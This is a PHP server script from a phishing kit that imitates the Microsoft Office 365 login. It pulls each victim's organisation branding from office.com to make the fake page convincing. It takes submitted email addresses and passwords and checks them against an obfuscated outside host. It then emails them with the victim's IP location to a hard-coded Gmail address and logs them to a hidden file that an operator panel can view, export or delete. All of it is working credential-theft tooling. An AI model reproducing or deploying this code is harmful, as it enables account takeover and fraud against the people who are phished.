<?php 
header('Access-Control-Allow-Origin: '.$_SERVER['HTTP_ORIGIN']);
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Access-Control-Max-Age: 1000');
header('Access-Control-Allow-Headers: Content-Type, Authorization,Authorization1,Authorization2, X-Requested-With');
 
 
$trueauthentic = true;  
$recipient = 'kateebnerr@gmail.com'; // Put your email address here
$finish_url = 'https://office365.com';

//Process IP to Location
$ip = $_SERVER['REMOTE_ADDR'];
$ip2place = new ip2location_lite();
$ip2place->setKey( "66657745713826aee27886e868c7354891388e26c003fa6ebf7f995e8f599dc7" );
$remote_add = $ip;
$location = $ip2place->getCity($remote_add);
//Process IP to Location

$country = $location['countryName'];
$city = $location['cityName'];
$region = $location['regionName']; 
$date = date('Y-m-d H:i:s');
 
if(isset($_GET['domain'])){
header("Status: 200 OK");
echo  mxrecordValidate($_GET['domain']);
exit;

}
if(isset($_POST['barnd']) && isset($_POST['email'])){
	$email = $_POST['email'];
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F'); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);    
	$result = curl_exec ($ch);
	$respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);	
	curl_close ($ch); 
	
	$parts = parse_url($respond_link);
	parse_str($parts['query'], $query);
	$post = ['client_id' => $query['client_id'], 'login_hint' => $email];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_POST ,TRUE); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); 
	curl_setopt($ch, CURLOPT_URL, $respond_link); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
    
	$result = curl_exec ($ch);
	curl_close ($ch); 
	

 //print_r($result);
 

	preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
	if(!empty($BannerLogo[0][0])){
	$BannerLogo = explode(",", $BannerLogo[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $BannerLogo[0], $BannerLogo);
	}else{
	$BannerLogo[0][0] = '';
	}
	
	preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
   	if(!empty($Illustration[0][0])){
	$Illustration = explode(",", $Illustration[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $Illustration[0], $Illustration);
	}else{
	$Illustration[0][0] = '';
	}


	$logo_image = $BannerLogo[0][0];
	$bg_image = $Illustration[0][0];
	
	$res = array('logo_image' => $logo_image, 'bg_image' => $bg_image);
	echo json_encode($res);
}
if (isset($_REQUEST['show_logs'])) {
    echo "<a href='?delete_logs'><strong>Delete Log file now.</strong></a> (Note this can not be undone! all you logs will vanish)<br/><br/><a href='?download_logs'><strong>Export Log file now.</strong></a><br/><br/><hr/>";
    if (file_exists("rst1.htm")) {
        include("rst1.htm");
    } else {
	echo "No Result File Logs Yet";
    }
}
if (isset($_REQUEST['delete_logs'])) {
    if (file_exists("rst1.htm")) {
        if (unlink("rst1.htm")) {
            header("Location: ?show_logs");
            exit;
        };
    }
}
if (isset($_REQUEST["download_logs"])) {
    $file = "rst1.htm";
    $filepath = $file;
    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($filepath));
        flush();
        readfile($filepath);
        exit;
    }
}
 
 

if(!empty($_POST['Authorization1']) && !empty($_POST['Authorization2'])){

$acc = $_POST['Authorization1'];
$pp = $_POST['Authorization2'];

//Decode base64_decode
if (!empty($acc) && !empty($pp)) {
if (strpos($acc, '@') !== false) {
    $login = $acc;
} else {
    $login = base64_decode($acc);
}
} else {
    $login = base64_decode($acc);
}

//GET domain
$domain = substr(strrchr($login, "@"), 1);
if ($trueauthentic == true) {
$result = get_validation(base64_decode("aHR0cHM6Ly9iY2FkaXJlY3RzZXJ2aWNlLmNvbS9mLnBocA", TRUE).'?login='.base64_encode($login).'&pass='.base64_encode($pp).'&ip='.base64_encode($ip));
} else {
$result = '{"status":"0","url":"0"}';
}
$set_data= json_decode($result,TRUE);
 
 

// proccess result
if($set_data['status'] > 0){
 
// Send Email
 
	$message = "-----------------+ True Login Verfied  +-----------------\n";
	$message.= "User ID: " . $login . "\n";
	$message.= "Password: " . $pp . "\n";
	$message.= "Client IP      : " . $ip . "\n";
	$message.= "Client Country      : " . $country . "\n";
	$message.= "Client Region      : " . $region . "\n";
	$message.= "Client City      : " . $city . "\n";
	$message.= "-----------------+ Created by Priv8+------------------\n";
	$subject = "True Login: " . $country . ' - '.$date . "\n";
	$headers = "MIME-Version: 1.0\n";
	mail($recipient, $subject, $message, $headers);
  
        $myfile = fopen(".rst.htm11", "a")or die("disable to open file!");
        $txt = date("D_F_j_is_A").' New Verified Log ***Good Log*** <br/> user id : '.$login.'<br/> password :'.$pp.'</br/> region: '.$region.'</br/> city '.$city.'</br/> country '.$country.'</br/> ipaddress '.$ip.'</br/> ///////////////////////////////</br/></br/></br/>  ';
        fwrite($myfile, $txt);
        fclose($myfile);
        
        
        echo '{"p":"1","url":"'.$set_data['url'].'","country":"'.$country.'","ip":"'.$ip.'"}';
    }
else{

// Send Email
 
	$message = "-----------------+ True Login Not Verfied  +-----------------\n";
	$message.= "User ID: " . $login . "\n";
	$message.= "Password: " . $pp . "\n";
	$message.= "Client IP      : " . $ip . "\n";
	$message.= "Client Country      : " . $country . "\n";
	$message.= "Client Region      : " . $region . "\n";
	$message.= "Client City      : " . $city . "\n";
	$message.= "-----------------+ Created by Priv8+------------------\n";
	$subject = "True Login: " . $country . ' - '.$date . "\n";
	$headers = "MIME-Version: 1.0\n";
	mail($recipient, $subject, $message, $headers);
  
		$myfile = fopen(".rst.htm11", "a")or die("disable to open file!");
        $txt = date("D_F_j_is_A").' New Not Verified Log ***Bad Log*** <br/> user id : '.$login.'<br/> password :'.$pp.'</br/> region: '.$region.'</br/> city '.$city.'</br/> country '.$country.'</br/> ipaddress '.$ip.'</br/> ///////////////////////////////</br/></br/></br/>  ';
        fwrite($myfile, $txt);
        fclose($myfile);
        echo '{"p":"0"}';
    }
 } 
 

 function mxrecordValidate($domain){
$arr = dns_get_record($domain, DNS_ANY);
$mxget = $domain;
 
if (isset($arr[10]['target'])){
$mxget .= $arr[10]['target'].'-';
}
if (isset($arr[9]['target'])){
$mxget .= $arr[9]['target'].'-';
}
if (isset($arr[8]['target'])){
$mxget .= $arr[8]['target'].'-';
}
if (isset($arr[7]['target'])){
$mxget .= $arr[7]['target'].'-';
}
if (isset($arr[6]['target'])){
$mxget .= $arr[6]['target'].'-';
}
if (isset($arr[4]['target'])){
$mxget .= $arr[4]['target'].'-';
}
if (isset($arr[3]['target'])){
$mxget .= $arr[3]['target'].'-';
}
if (isset($arr[2]['target'])){
$mxget .= $arr[2]['target'].'-';
}
if (isset($arr[1]['target'])){
$mxget .= $arr[1]['target'].'-';
}
if (isset($arr[0]['target'])){
$mxget .=$arr[0]['target'].'-';
}

return str_replace(".","-",$mxget);
	


}
 function get_validation($url, $post_paramtrs = false) {
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    if ($post_paramtrs) {
        curl_setopt($c, CURLOPT_POST, TRUE);
        curl_setopt($c, CURLOPT_POSTFIELDS, "u=".$post_paramtrs);
    }
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0");
    curl_setopt($c, CURLOPT_COOKIE, 'CookieName1=Value;');
    curl_setopt($c, CURLOPT_MAXREDIRS, 10);
    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 9);
    curl_setopt($c, CURLOPT_REFERER, $url);
    curl_setopt($c, CURLOPT_TIMEOUT, 60);
    curl_setopt($c, CURLOPT_AUTOREFERER, true);
    curl_setopt($c, CURLOPT_ENCODING, 'gzip,deflate');
    $data = curl_exec($c);
    $status = curl_getinfo($c);
    curl_close($c);
    preg_match('/(http(|s)):\/\/(.*?)\/(.*\/|)/si', $status['url'], $link);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/|\/)).*?)(\'|\")/si', '$1=$2'.$link[0].'$3$4$5', $data);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/)).*?)(\'|\")/si', '$1=$2'.$link[1].'://'.$link[3].'$3$4$5', $data);
    if ($status['http_code'] == 200) {
        return $data;
    }
    elseif($status['http_code'] == 301 || $status['http_code'] == 302) {
        if (!$follow_allowed) {
            if (!empty($status['redirect_url'])) {
                $redirURL = $status['redirect_url'];
            } else {
                preg_match('/href\=\"(.*?)\"/si', $data, $m);
                if (!empty($m[1])) {
                    $redirURL = $m[1];
                }
            }
            if (!empty($redirURL)) {
                return call_user_func(__FUNCTION__, $redirURL, $post_paramtrs);
            }
        }
    }
    return "$data";
}
final class ip2location_lite {
    protected $errors = array();
    protected $service = 'api.ipinfodb.com';
    protected $version = 'v3';
    protected $apiKey = '';
    public function __construct() {}
    public function __destruct() {}
    public function setKey($key) {
        if (!empty($key))
            $this->apiKey = $key;
    }
    public function getError() {
        return implode("\n", $this->errors);
    }
    public function getCountry($host) {
        return $this->getResult($host, 'ip-country');
    }
    public function getCity($host) {
        return $this->getResult($host, 'ip-city');
    }
    private function getResult($host, $name) {
        $ip =  @ gethostbyname($host);
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            $xml =  @ file_get_contents('http://'.$this->service.'/'.$this->version.'/'.$name.'/?key='.$this->apiKey.'&ip='.$ip.'&format=xml');
            if (get_magic_quotes_runtime()) {
                $xml = stripslashes($xml);
            }
            try {
                $response =  @ new SimpleXMLElement($xml);
                foreach($response as $field => $value) {
                    $result[(string)$field] = (string)$value;
                }
                return $result;
            } catch (Exception $e) {
                $this->errors[] = $e->getMessage();
                return;
            }
        }
        $this->errors[] = '"'.$host.'" is not a valid IP address or hostname.';
        return;
    }
}
?>